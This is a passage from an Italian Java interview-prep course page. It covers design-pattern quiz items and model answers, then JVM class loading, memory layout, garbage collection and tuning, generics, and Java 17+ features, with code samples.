                    <h4>Q74. Quando preferiresti Strategy pattern invece di un semplice if/else?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q74" value="a">
                            <span>Quando ci sono molte varianti e potrebbero aggiungersene altre</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q74" value="b">
                            <span>Sempre, if/else è un anti-pattern</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q74" value="c">
                            <span>Quando le condizioni sono semplici boolean</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q74" value="d">
                            <span>Solo in linguaggi che non supportano lambda</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q74')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q74"></div>
                </div>

                <div class="quiz-question" data-correct="c">
                    <h4>Q75. Servlet Filters in Java EE implementano quale pattern?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q75" value="a">
                            <span>Observer: osservano le richieste HTTP</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q75" value="b">
                            <span>Decorator: decorano la request/response</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q75" value="c">
                            <span>Chain of Responsibility: passano la request lungo una catena</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q75" value="d">
                            <span>Command: incapsulano le richieste come oggetti</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q75')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q75"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 15 -->
            <section class="section" id="modulo15-questions">
                <h2>Domande da Colloquio - Modulo 15</h2>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra Factory Method e Abstract Factory.</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Factory Method</strong> definisce un'interfaccia per creare UN oggetto, ma lascia alle sottoclassi decidere quale classe istanziare. È un metodo (spesso astratto) che ritorna un prodotto. <strong>Abstract Factory</strong> crea FAMIGLIE di oggetti correlati senza specificare classi concrete. Ha più factory method per prodotti diversi della stessa "famiglia". Esempio: Factory Method = createButton() che ritorna Button. Abstract Factory = GUIFactory con createButton() e createCheckbox() che ritornano prodotti coerenti (tutti Windows o tutti Mac).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando useresti Decorator vs Proxy?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Decorator</strong> aggiunge COMPORTAMENTO. È usato per estendere funzionalità dinamicamente (buffering, compressione, logging). Il client sa che sta usando un decorator (composizione esplicita). <strong>Proxy</strong> controlla ACCESSO all'oggetto reale. Tipi: lazy loading (carica solo quando serve), protection (verifica permessi), remote (nasconde comunicazione di rete). Il client spesso non sa di usare un proxy. Esempio: Java I/O Streams = Decorator. Spring @Transactional = Proxy. JPA lazy loading = Proxy.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come implementeresti un Singleton thread-safe?</h4>
                    <p><strong>Risposta attesa:</strong> Opzioni: 1) <strong>Enum Singleton</strong> (BEST): thread-safe, serialization-safe, reflection-safe gratuitamente. 2) <strong>Initialization-on-demand holder</strong>: classe inner statica, il class loader garantisce thread-safety. 3) <strong>Double-checked locking</strong>: con volatile! Senza volatile, instruction reordering può causare la visibilità di un oggetto parzialmente costruito. 4) <strong>Synchronized getInstance()</strong>: semplice ma lento. In applicazioni moderne, preferisco Dependency Injection: @Service in Spring è singleton ma testabile e iniettabile.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quali design pattern sono usati in Spring Framework?</h4>
                    <p><strong>Risposta attesa:</strong> Spring è pieno di pattern! <strong>Dependency Injection</strong>: il core, IoC container inietta dipendenze. <strong>Proxy</strong>: @Transactional, @Cacheable, @Async creano proxy AOP. <strong>Singleton</strong>: beans sono singleton di default. <strong>Factory</strong>: BeanFactory crea beans. <strong>Template Method</strong>: JdbcTemplate, RestTemplate - tu fornisci il callback, il template gestisce boilerplate. <strong>Observer</strong>: ApplicationEvent e @EventListener. <strong>Strategy</strong>: varie implementazioni intercambiabili (TransactionManager, CacheManager). <strong>Adapter</strong>: HandlerAdapter in Spring MVC.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando NON useresti un design pattern?</h4>
                    <p><strong>Risposta attesa:</strong> Non usare pattern quando: 1) <strong>YAGNI</strong>: non hai bisogno di quella flessibilità ORA. Un pattern per "il futuro" è over-engineering. 2) <strong>Troppo semplice</strong>: se hai 2 casi, un if/else è meglio di Strategy con 3 classi. 3) <strong>Team non lo conosce</strong>: codice che nessuno capisce è peggio di codice "imperfetto" ma chiaro. 4) <strong>One-off</strong>: se il problema appare una sola volta, risolvi il caso specifico. Applica pattern quando il problema si ripete e il beneficio supera la complessità. Start simple, refactor when needed.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come si relaziona Strategy pattern con le lambda di Java 8?</h4>
                    <p><strong>Risposta attesa:</strong> Le lambda hanno reso Strategy molto più leggero! Prima di Java 8: creavi interfaccia + N classi concrete. Con lambda: se l'interfaccia è functional (un solo metodo astratto), puoi passare una lambda direttamente. Comparator è l'esempio perfetto: invece di class NameComparator implements Comparator&lt;User&gt;, scrivi users.sort((a, b) -> a.getName().compareTo(b.getName())) o users.sort(Comparator.comparing(User::getName)). La lambda È la strategy, inline, senza boilerplate. Stessa semantica, sintassi più concisa.</p>
                </div>
            </section>

            <!-- Links Modulo 15 -->
            <section class="section" id="modulo15-links">
                <h2>Link di Approfondimento - Modulo 15</h2>

                <div class="info-box">
                    <h4>Design Patterns - Generale</h4>
                    <p><a href="https://refactoring.guru/design-patterns" target="_blank">Refactoring.Guru: Design Patterns</a> - Spiegazioni eccellenti con diagrammi</p>
                    <p><a href="https://www.baeldung.com/design-patterns-series" target="_blank">Baeldung: Design Patterns in Java</a></p>
                    <p><a href="https://sourcemaking.com/design_patterns" target="_blank">SourceMaking: Design Patterns</a></p>
                </div>

                <div class="info-box">
                    <h4>Creational Patterns</h4>
                    <p><a href="https://www.baeldung.com/java-builder-pattern" target="_blank">Baeldung: Builder Pattern</a></p>
                    <p><a href="https://www.baeldung.com/java-singleton" target="_blank">Baeldung: Singleton Pattern</a></p>
                    <p><a href="https://www.baeldung.com/java-factory-pattern" target="_blank">Baeldung: Factory Pattern</a></p>
                </div>

                <div class="info-box">
                    <h4>Structural & Behavioral Patterns</h4>
                    <p><a href="https://www.baeldung.com/java-decorator-pattern" target="_blank">Baeldung: Decorator Pattern</a></p>
                    <p><a href="https://www.baeldung.com/java-proxy-pattern" target="_blank">Baeldung: Proxy Pattern</a></p>
                    <p><a href="https://www.baeldung.com/java-strategy-pattern" target="_blank">Baeldung: Strategy Pattern</a></p>
                    <p><a href="https://www.baeldung.com/java-observer-pattern" target="_blank">Baeldung: Observer Pattern</a></p>
                </div>

                <div class="info-box">
                    <h4>Libri Consigliati</h4>
                    <p><a href="https://www.amazon.com/Design-Patterns-Elements-Reusable-Object-Oriented/dp/0201633612" target="_blank">Design Patterns: Elements of Reusable Object-Oriented Software</a> - Gang of Four (GoF)</p>
                    <p><a href="https://www.amazon.com/Head-First-Design-Patterns-Brain-Friendly/dp/0596007124" target="_blank">Head First Design Patterns</a> - Più accessibile</p>
                    <p><a href="https://www.amazon.com/Effective-Java-Joshua-Bloch/dp/0134685997" target="_blank">Effective Java</a> - Joshua Bloch (include pattern)</p>
                </div>
            </section>

            <!-- ==================== MODULO 16: JAVA INTERNALS & JVM ==================== -->
            <header class="module-header" id="modulo16">
                <span class="module-tag">Modulo 16</span>
                <h1>Java Internals & JVM</h1>
                <p>Comprendi il funzionamento interno della JVM: class loading, memory management, garbage collection, generics e le moderne feature di Java 17+.</p>
            </header>

            <!-- Class Loading -->
            <section class="section" id="modulo16-classloading">
                <h2>Class Loading</h2>

                <p>La JVM carica le classi dinamicamente, solo quando sono necessarie. Il processo coinvolge una gerarchia di ClassLoader con il principio di <strong>delegation</strong>.</p>

                <h3>Gerarchia dei ClassLoader</h3>

                <div class="diagram"><pre>
┌─────────────────────────────────────────────────────────────┐
│                    Bootstrap ClassLoader                      │
│    (C/C++ nativo - carica java.lang.*, java.util.*, etc.)   │
└─────────────────────────┬───────────────────────────────────┘
                          │ parent
┌─────────────────────────▼───────────────────────────────────┐
│                   Platform ClassLoader                        │
│        (Java 9+, ex Extension - carica moduli platform)      │
└─────────────────────────┬───────────────────────────────────┘
                          │ parent
┌─────────────────────────▼───────────────────────────────────┐
│                  Application ClassLoader                      │
│            (carica classi dal classpath dell'app)            │
└─────────────────────────┬───────────────────────────────────┘
                          │ parent
┌─────────────────────────▼───────────────────────────────────┐
│                    Custom ClassLoaders                        │
│     (es: Tomcat per isolare webapp, OSGi per modularità)     │
└─────────────────────────────────────────────────────────────┘
</pre></div>

                <h3>Principio di Delegation (Parent-First)</h3>
                <p>Quando richiedi una classe, il ClassLoader delega PRIMA al parent:</p>

<pre><code class="language-java">// Pseudocodice del meccanismo di delegation
public Class&lt;?&gt; loadClass(String name) {
    // 1. Controlla se già caricata
    Class&lt;?&gt; c = findLoadedClass(name);
    if (c != null) return c;

    // 2. Delega al parent (PARENT-FIRST)
    try {
        c = parent.loadClass(name);
        if (c != null) return c;
    } catch (ClassNotFoundException e) {
        // Parent non ha la classe, proviamo noi
    }

    // 3. Carica la classe direttamente
    return findClass(name);
}</code></pre>

                <div class="info-box">
                    <h4>Perché Parent-First?</h4>
                    <p><strong>Sicurezza:</strong> Impedisce che un'applicazione malevola sostituisca java.lang.String con una versione compromessa. La versione del Bootstrap ha sempre precedenza.</p>
                    <p><strong>Consistenza:</strong> Tutte le applicazioni usano le stesse classi core, evitando versioni multiple incompatibili in memoria.</p>
                </div>

                <h3>Fasi del Class Loading</h3>
                <p>Il caricamento di una classe avviene in tre fasi:</p>

                <div class="diagram"><pre>
1. LOADING                    2. LINKING                      3. INITIALIZATION
   ↓                             ↓                                ↓
┌──────────┐              ┌─────────────┐                 ┌──────────────┐
│ .class   │──────────────│ Verification │────────────────│ Static init  │
│  file    │              │ Preparation  │                │ &lt;clinit&gt;    │
│ (bytes)  │              │ Resolution   │                │ static {}    │
└──────────┘              └─────────────┘                 └──────────────┘
                                │
                    ┌───────────┼───────────┐
                    ▼           ▼           ▼
              Verification  Preparation  Resolution
              (bytecode     (alloca      (risolve
               valido?)     memoria      riferimenti
                           per static)   simbolici)
</pre></div>

<pre><code class="language-java">// Esempio: quando viene inizializzata una classe?
public class LazyInit {
    static {
        System.out.println("LazyInit initialized!");
    }

    public static final int CONSTANT = 42;  // Costante compile-time
    public static int value = compute();     // Richiede inizializzazione

    private static int compute() {
        System.out.println("Computing value...");
        return 100;
    }
}

// Caso 1: NON inizializza la classe (costante inline dal compilatore)
int x = LazyInit.CONSTANT;  // Nessun output!

// Caso 2: Inizializza la classe
int y = LazyInit.value;     // Output: "LazyInit initialized!" + "Computing value..."

// Caso 3: Inizializza la classe
Class&lt;?&gt; c = Class.forName("LazyInit");  // Forza inizializzazione</code></pre>

                <div class="info-box warning">
                    <h4>ClassLoader Leak (Memory Leak comune)</h4>
                    <p>In container come Tomcat, ogni webapp ha il suo ClassLoader. Se una classe della webapp tiene un riferimento a una classe del container (o viceversa), il ClassLoader non può essere garbage collected durante il redeploy. Risultato: PermGen/Metaspace OutOfMemoryError dopo molti redeploy.</p>
                </div>
            </section>

            <!-- Memory Model -->
            <section class="section" id="modulo16-memory">
                <h2>JVM Memory Model</h2>

                <p>La JVM organizza la memoria in diverse aree, ciascuna con scopo e ciclo di vita specifici.</p>

                <div class="diagram"><pre>
┌───────────────────────────────────────────────────────────────────────┐
│                           JVM MEMORY                                  │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  ┌─────────────────────────────────────────────────────────────────┐  │
│  │                          HEAP (shared)                          │  │
│  │  ┌─────────────────────────┐  ┌───────────────────────────────┐ │  │
│  │  │     Young Generation    │  │       Old Generation          │ │  │
│  │  │  ┌─────┐ ┌───────────┐  │  │                               │ │  │
│  │  │  │Eden │ │ Survivor  │  │  │   Long-lived objects          │ │  │
│  │  │  │     │ │  S0 | S1  │  │  │   (promoted from Young)       │ │  │
│  │  │  └─────┘ └───────────┘  │  │                               │ │  │
│  │  └─────────────────────────┘  └───────────────────────────────┘ │  │
│  └─────────────────────────────────────────────────────────────────┘  │
│                                                                       │
│  ┌─────────────────────┐  ┌─────────────────┐  ┌─────────────────┐   │
│  │    Metaspace        │  │   Code Cache    │  │  Direct Memory  │   │
│  │  (class metadata)   │  │  (JIT compiled) │  │  (NIO buffers)  │   │
│  │  [native memory]    │  │                 │  │  [off-heap]     │   │
│  └─────────────────────┘  └─────────────────┘  └─────────────────┘   │
│                                                                       │
│  ┌────────────────────────────────────────────────────────────────┐  │
│  │              PER-THREAD (non shared)                           │  │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐         │  │
│  │  │  Thread 1    │  │  Thread 2    │  │  Thread N    │         │  │
│  │  │ ┌──────────┐ │  │ ┌──────────┐ │  │ ┌──────────┐ │         │  │
│  │  │ │  Stack   │ │  │ │  Stack   │ │  │ │  Stack   │ │         │  │
│  │  │ │ (frames) │ │  │ │ (frames) │ │  │ │ (frames) │ │         │  │
│  │  │ ├──────────┤ │  │ ├──────────┤ │  │ ├──────────┤ │         │  │
│  │  │ │   PC     │ │  │ │   PC     │ │  │ │   PC     │ │         │  │
│  │  │ │ Register │ │  │ │ Register │ │  │ │ Register │ │         │  │
│  │  │ └──────────┘ │  │ └──────────┘ │  │ └──────────┘ │         │  │
│  │  └──────────────┘  └──────────────┘  └──────────────┘         │  │
│  └────────────────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────────────────┘
</pre></div>

                <h3>Stack vs Heap</h3>

<pre><code class="language-java">public class MemoryExample {
    private int instanceVar = 10;     // Heap (parte dell'oggetto)
    private static int staticVar = 20; // Metaspace

    public void method() {
        int localVar = 30;            // Stack (frame del metodo)
        String str = "hello";         // str (reference) → Stack
                                      // "hello" (String object) → Heap
                                      // (String Pool, special area)

        Object obj = new Object();    // obj (reference) → Stack
                                      // new Object() → Heap (Eden)

        int[] arr = new int[100];     // arr (reference) → Stack
                                      // int[100] → Heap (ma primitivi inline)
    }
}</code></pre>

                <h3>JIT Compilation: C1, C2, e Graal</h3>
                <p>La JVM usa <strong>tiered compilation</strong> per ottimizzare il codice hot:</p>

                <div class="diagram"><pre>
Level 0: Interpreted
    ↓ (dopo N invocazioni)
Level 1-3: C1 Compiler (Client)
    - Compilazione veloce
    - Ottimizzazioni base (inlining semplice)
    - Raccolta profiling data
    ↓ (se hot + profiling suggerisce)
Level 4: C2 Compiler (Server) o Graal
    - Compilazione lenta ma molto ottimizzata
    - Escape analysis
    - Loop unrolling
    - Aggressive inlining
    - Vectorization (SIMD)
</pre></div>

<pre><code class="language-java">// Esempio: Escape Analysis
public long sumVector() {
    // Senza escape analysis: alloca Point sul heap ogni iterazione
    // CON escape analysis: Point NON "escapa" dal metodo
    //     → JIT può allocare su stack o eliminare l'oggetto del tutto
    long sum = 0;
    for (int i = 0; i < 1_000_000; i++) {
        Point p = new Point(i, i);  // Scalar replacement!
        sum += p.x + p.y;           // Diventa: sum += i + i;
    }
    return sum;
}

// Escape Analysis fallisce se l'oggetto "escapa":
Point p = new Point(1, 2);
list.add(p);  // p escapa → deve stare su heap</code></pre>

                <div class="info-box success">
                    <h4>JVM Flag utili</h4>
                    <p><code>-XX:+PrintCompilation</code> - mostra cosa viene compilato JIT</p>
                    <p><code>-XX:+UnlockDiagnosticVMOptions -XX:+PrintInlining</code> - mostra inlining decisions</p>
                    <p><code>-XX:CompileThreshold=10000</code> - soglia invocazioni per compilazione</p>
                </div>
            </section>

            <!-- Garbage Collection -->
            <section class="section" id="modulo16-gc">
                <h2>Garbage Collection</h2>

                <p>Il GC libera automaticamente la memoria degli oggetti non più raggiungibili. Comprendere il GC è fondamentale per prevenire pause eccessive e memory leak.</p>

                <h3>GC Roots e Reachability</h3>
                <p>Un oggetto è "vivo" se raggiungibile (direttamente o indirettamente) da un <strong>GC Root</strong>:</p>

                <div class="diagram"><pre>
GC ROOTS (starting points per la reachability analysis):

┌─────────────────┐
│  Stack frames   │ ← variabili locali dei thread attivi
├─────────────────┤
│  Static fields  │ ← campi statici delle classi caricate
├─────────────────┤
│  JNI references │ ← riferimenti dal codice nativo
├─────────────────┤
│  Monitor locks  │ ← oggetti usati come lock in synchronized
└─────────────────┘
         │
         ▼ (seguendo i reference)
    ┌─────────┐     ┌─────────┐
    │ Object  │────▶│ Object  │ ← REACHABLE (vivo)
    └─────────┘     └─────────┘
                         │
                    ┌────▼────┐
                    │ Object  │ ← REACHABLE (vivo)
                    └─────────┘


    ┌─────────┐     ┌─────────┐
    │ Object  │────▶│ Object  │ ← UNREACHABLE (garbage)
    └─────────┘     └─────────┘
    (nessun GC root raggiunge questi oggetti)
</pre></div>

                <h3>Generational GC</h3>
                <p>La maggior parte degli oggetti muore giovane (<strong>Weak Generational Hypothesis</strong>). Il GC sfrutta questo pattern:</p>

<pre><code class="language-java">// Generational GC in azione:

// 1. YOUNG GC (Minor GC) - frequente, veloce
//    - Nuovi oggetti allocati in Eden
//    - Quando Eden è pieno → Young GC
//    - Oggetti vivi copiati in Survivor space (S0 o S1)
//    - Eden e vecchio Survivor svuotati completamente

// 2. PROMOTION (aging)
//    - Ogni Young GC sopravvissuto incrementa "age"
//    - Dopo N sopravvivenze (default 15) → promoted to Old Gen
//    - Oggetti grandi possono andare direttamente in Old

// 3. FULL GC (Major GC) - raro, lento
//    - Quando Old Generation è quasi piena
//    - Analizza TUTTO l'heap
//    - Può causare pause significative (STW)</code></pre>

                <h3>GC Algorithms</h3>

                <div class="info-box">
                    <h4>Serial GC (-XX:+UseSerialGC)</h4>
                    <p><strong>Single-threaded</strong>, stop-the-world per tutto il GC. Adatto per applicazioni piccole, single-core, o container con poca memoria. Semplice, basso overhead, ma pause lunghe.</p>
                </div>

                <div class="info-box">
                    <h4>Parallel GC (-XX:+UseParallelGC)</h4>
                    <p><strong>Multi-threaded</strong> per Young e Old GC. Default in Java 8. Ottimizza il <strong>throughput</strong> (tempo totale speso in GC). Pause STW più brevi del Serial ma non ottimizzate per latenza.</p>
                </div>

                <div class="info-box success">
                    <h4>G1 GC (-XX:+UseG1GC) - Default da Java 9</h4>
                    <p>Divide l'heap in <strong>regioni</strong> (~2000, ciascuna 1-32MB). Raccoglie prima le regioni con più garbage (<strong>Garbage-First</strong>). Target pause configurabile con <code>-XX:MaxGCPauseMillis=200</code>. Bilanciamento tra throughput e latency.</p>
                </div>

                <div class="info-box success">
                    <h4>ZGC (-XX:+UseZGC) - Java 15+ (production-ready)</h4>
                    <p><strong>Ultra-low latency</strong>: pause &lt; 1ms indipendentemente dalla heap size (può gestire TB di heap). Usa <strong>colored pointers</strong> e load barriers. Concurrent marking, relocation, e reference processing. Ideale per latency-critical applications.</p>
                </div>

                <div class="info-box">
                    <h4>Shenandoah (-XX:+UseShenandoahGC)</h4>
                    <p>Simile a ZGC negli obiettivi (low-latency). Usa <strong>Brooks pointers</strong> invece di colored pointers. Disponibile in OpenJDK, non in Oracle JDK.</p>
                </div>

                <h3>GC Tuning Comune</h3>

<pre><code class="language-bash"># Heap sizing
-Xms4g -Xmx4g          # Min/Max heap (stesso valore evita resize)
-XX:NewRatio=2         # Old:Young = 2:1

# G1 tuning
-XX:MaxGCPauseMillis=100    # Target pause (G1 adatta la collection)
-XX:G1HeapRegionSize=16m    # Dimensione regione

# Monitoring
-Xlog:gc*:file=gc.log:time  # GC logging (Java 9+)
-XX:+HeapDumpOnOutOfMemoryError  # Dump heap su OOM
-XX:HeapDumpPath=/path/dump.hprof

# ZGC tuning (poco da tuning, è auto-adattativo)
-XX:+UseZGC
-XX:ZCollectionInterval=5    # Suggerisce intervallo tra GC</code></pre>

                <h3>Memory Leak: Cause Comuni</h3>

<pre><code class="language-java">// 1. Collection che cresce indefinitamente
private static List&lt;Object&gt; cache = new ArrayList&lt;&gt;();
public void process(Object o) {
    cache.add(o);  // Mai rimosso! → Memory leak
}

// 2. Listener/callback non deregistrati
button.addActionListener(this);  // Se 'this' vive più del button...
// Soluzione: usare WeakReference o deregistrare esplicitamente

// 3. ThreadLocal non puliti (specialmente in thread pool)
private static ThreadLocal&lt;Connection&gt; connHolder = new ThreadLocal&lt;&gt;();
public void process() {
    connHolder.set(getConnection());
    // ... usa connection ...
    // MANCANTE: connHolder.remove() → leak se thread riusato
}

// 4. Inner class non-static tiene riferimento all'outer
public class Outer {
    private byte[] data = new byte[1_000_000];

    public Runnable createTask() {
        return new Runnable() {  // Inner class tiene Outer.this!
            public void run() { /* non usa data */ }
        };
    }
    // Soluzione: rendere Runnable static o usare lambda (se non cattura this)
}

// 5. StringBuilder in loop
String result = "";
for (String s : list) {
    result += s;  // Crea nuova String ogni iterazione!
}
// Soluzione: usare StringBuilder esplicitamente</code></pre>

                <div class="info-box warning">
                    <h4>Diagnosi Memory Leak</h4>
                    <p><strong>1. Heap Dump:</strong> <code>jmap -dump:format=b,file=heap.hprof &lt;pid&gt;</code></p>
                    <p><strong>2. Analisi con Eclipse MAT:</strong> Cerca "Leak Suspects" e "Dominator Tree"</p>
                    <p><strong>3. Monitoring continuo:</strong> Grafana + Prometheus con metriche JVM (heap, GC pause, allocation rate)</p>
                </div>
            </section>

            <!-- Generics Deep Dive -->
            <section class="section" id="modulo16-generics">
                <h2>Generics Deep Dive</h2>

                <h3>Type Erasure</h3>
                <p>I generics Java esistono solo a <strong>compile-time</strong>. A runtime, i tipi parametrici vengono "cancellati" (erased):</p>

<pre><code class="language-java">// Quello che scrivi:
List&lt;String&gt; strings = new ArrayList&lt;String&gt;();
strings.add("hello");
String s = strings.get(0);

// Quello che esiste a runtime (dopo type erasure):
List strings = new ArrayList();
strings.add("hello");
String s = (String) strings.get(0);  // Cast inserito dal compilatore

// Conseguenze della type erasure:
// 1. Non puoi usare instanceof con generics
if (list instanceof List&lt;String&gt;) { }  // ERRORE di compilazione!
if (list instanceof List&lt;?&gt;) { }       // OK, ma non utile

// 2. Non puoi creare array di tipi generici
T[] arr = new T[10];                    // ERRORE!
List&lt;String&gt;[] lists = new List&lt;String&gt;[10];  // ERRORE!

// 3. Non puoi ottenere il Class di un tipo parametrico
Class&lt;T&gt; clazz = T.class;              // ERRORE!

// Workaround comune: passare Class esplicitamente
public &lt;T&gt; T deserialize(byte[] data, Class&lt;T&gt; type) {
    return type.cast(/* ... */);
}</code></pre>

                <h3>Bounded Wildcards: PECS</h3>
                <p><strong>PECS = Producer Extends, Consumer Super</strong> (mnemonico di Joshua Bloch)</p>

<pre><code class="language-java">// PRODUCER: quando LEGGI da una struttura → ? extends T
// La struttura PRODUCE elementi di tipo T (o sottotipi)
public void printAll(List&lt;? extends Number&gt; numbers) {
    for (Number n : numbers) {  // OK: legge come Number
        System.out.println(n);
    }
    // numbers.add(1);  // ERRORE! Non sai il tipo esatto della lista
}
printAll(List.of(1, 2, 3));          // List&lt;Integer&gt; OK
printAll(List.of(1.0, 2.0, 3.0));    // List&lt;Double&gt; OK

// CONSUMER: quando SCRIVI in una struttura → ? super T
// La struttura CONSUMA elementi di tipo T
public void addNumbers(List&lt;? super Integer&gt; dest) {
    dest.add(1);    // OK: Integer è accettato
    dest.add(2);
    // Integer n = dest.get(0);  // ERRORE! Potrebbe essere Object
    Object o = dest.get(0);       // OK: sai che almeno è Object
}
addNumbers(new ArrayList&lt;Integer&gt;());  // OK
addNumbers(new ArrayList&lt;Number&gt;());   // OK
addNumbers(new ArrayList&lt;Object&gt;());   // OK

// Esempio reale: Collections.copy
public static &lt;T&gt; void copy(List&lt;? super T&gt; dest,    // Consumer
                            List&lt;? extends T&gt; src) { // Producer
    for (T item : src) {
        dest.add(item);
    }
}</code></pre>

                <h3>Generic Methods</h3>

<pre><code class="language-java">// Il tipo T è dichiarato PRIMA del return type
public &lt;T&gt; T firstOrDefault(List&lt;T&gt; list, T defaultValue) {
    return list.isEmpty() ? defaultValue : list.get(0);
}

// Multiple type parameters
public &lt;K, V&gt; Map&lt;K, V&gt; zipToMap(List&lt;K&gt; keys, List&lt;V&gt; values) {
    Map&lt;K, V&gt; map = new HashMap&lt;&gt;();
    for (int i = 0; i &lt; Math.min(keys.size(), values.size()); i++) {
        map.put(keys.get(i), values.get(i));
    }
    return map;
}

// Bounded type parameter
public &lt;T extends Comparable&lt;T&gt;&gt; T max(T a, T b) {
    return a.compareTo(b) &gt; 0 ? a : b;
}

// Ricorsivo (self-referential) - Pattern comune in builder
public abstract class Builder&lt;T extends Builder&lt;T&gt;&gt; {
    public T withName(String name) {
        this.name = name;
        return self();
    }
    protected abstract T self();
}

public class PersonBuilder extends Builder&lt;PersonBuilder&gt; {
    @Override protected PersonBuilder self() { return this; }
}</code></pre>

                <div class="info-box">
                    <h4>Type Witness (esplicito)</h4>
                    <p>A volte il compilatore non riesce a inferire il tipo. Puoi specificarlo esplicitamente:</p>
<pre><code class="language-java">// Senza type witness - errore di compilazione a volte
List&lt;String&gt; list = Collections.emptyList();  // OK in Java 8+ con target type

// Con type witness esplicito
List&lt;String&gt; list = Collections.&lt;String&gt;emptyList();

// Utile in chaining
Optional.&lt;String&gt;empty().orElse("default");</code></pre>
                </div>
            </section>

            <!-- Java 17+ Modern Features -->
            <section class="section" id="modulo16-modern">
                <h2>Java 17+ Modern Features</h2>

                <h3>Records (Java 14 preview, Java 16 stable)</h3>
                <p>Classi immutabili per trasportare dati, con boilerplate minimizzato:</p>

<pre><code class="language-java">// Prima di records (Java 8):
public final class Point {
    private final int x;
    private final int y;

    public Point(int x, int y) {
        this.x = x;
        this.y = y;
    }

    public int x() { return x; }
    public int y() { return y; }

    @Override public boolean equals(Object o) { /* ... */ }
    @Override public int hashCode() { return Objects.hash(x, y); }
    @Override public String toString() { return "Point[x=" + x + ", y=" + y + "]"; }
}

// Con records (Java 16+):
public record Point(int x, int y) { }

// Record con validazione e normalizzazione:
public record Email(String address) {
    // Compact constructor per validazione
    public Email {
        Objects.requireNonNull(address);
        address = address.toLowerCase().trim();  // Normalizzazione
        if (!address.contains("@")) {
            throw new IllegalArgumentException("Invalid email");
        }
    }

    // Metodi aggiuntivi OK
    public String domain() {
        return address.substring(address.indexOf("@") + 1);
    }
}

// Record con generics
public record Pair&lt;A, B&gt;(A first, B second) {
    public static &lt;A, B&gt; Pair&lt;A, B&gt; of(A a, B b) {
        return new Pair&lt;&gt;(a, b);
    }
}</code></pre>

                <h3>Sealed Classes (Java 15 preview, Java 17 stable)</h3>
                <p>Controllo esplicito su chi può estendere una classe:</p>

<pre><code class="language-java">// Definisci le sottoclassi permesse
public sealed class Shape
    permits Circle, Rectangle, Triangle {
    // ...
}

// Sottoclassi DEVONO essere final, sealed, o non-sealed
public final class Circle extends Shape {
    private final double radius;
    // Circle non può essere esteso
}

public sealed class Rectangle extends Shape
    permits Square {
    // Rectangle può essere esteso solo da Square
}

public final class Square extends Rectangle {
    // Square non può essere esteso
}

public non-sealed class Triangle extends Shape {
    // Triangle può essere esteso da chiunque (opt-out)
}

// Vantaggi con Pattern Matching (Java 21):
public double area(Shape shape) {
    return switch (shape) {
        case Circle c    -&gt; Math.PI * c.radius() * c.radius();
        case Rectangle r -&gt; r.width() * r.height();
        case Triangle t  -&gt; 0.5 * t.base() * t.height();
        // No default! Compilatore sa che sono tutti i casi
    };
}</code></pre>

                <h3>Pattern Matching (evolution)</h3>

<pre><code class="language-java">// Pattern Matching per instanceof (Java 16)
// Prima:
if (obj instanceof String) {
    String s = (String) obj;
    System.out.println(s.length());
}

// Dopo:
if (obj instanceof String s) {
    System.out.println(s.length());  // s già disponibile
}

// Con negazione (s nello scope del ramo else)
if (!(obj instanceof String s)) {
    return;
}
// s è disponibile qui (il compilatore sa che obj è String)

// Pattern Matching per switch (Java 21)
public String format(Object obj) {
    return switch (obj) {
        case Integer i  -&gt; "int: " + i;
        case Long l     -&gt; "long: " + l;
        case Double d   -&gt; "double: " + d;
        case String s   -&gt; "string: " + s;
        case null       -&gt; "null";
        default         -&gt; "unknown: " + obj.getClass();
    };
}

// Guard patterns (when clause) - Java 21
public String describe(Object obj) {
    return switch (obj) {
        case String s when s.isEmpty() -&gt; "empty string";
        case String s when s.length() &gt; 100 -&gt; "long string";
        case String s -&gt; "string: " + s;
        case Integer i when i &lt; 0 -&gt; "negative";
        case Integer i when i == 0 -&gt; "zero";
        case Integer i -&gt; "positive";
        default -&gt; "other";
    };
}

// Record Patterns (Java 21) - Destructuring!
public double length(Object obj) {
    return switch (obj) {
        case Point(int x, int y) -&gt; Math.sqrt(x*x + y*y);
        case Line(Point(int x1, int y1), Point(int x2, int y2))
            -&gt; Math.sqrt(Math.pow(x2-x1, 2) + Math.pow(y2-y1, 2));
        default -&gt; 0;
    };
}</code></pre>

                <div class="info-box success">
                    <h4>Altre Feature Notevoli</h4>
                    <p><strong>Text Blocks (Java 15):</strong> Multi-line strings con <code>"""..."""</code></p>
                    <p><strong>var (Java 10):</strong> Local variable type inference</p>
                    <p><strong>Switch Expressions (Java 14):</strong> Switch che ritorna un valore</p>
                    <p><strong>Unnamed Patterns _ (Java 22):</strong> <code>case Point(int x, _) -&gt;</code> ignora y</p>
                </div>
            </section>

            <!-- Quiz Modulo 16 -->
            <section class="quiz-section" id="modulo16-quiz">
                <h2>Quiz - Modulo 16</h2>

                <div class="quiz-question" data-correct="b">
                    <h4><span>Q76.</span> Cosa succede se definisci una classe java.lang.String nel tuo codice?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q76" value="a">
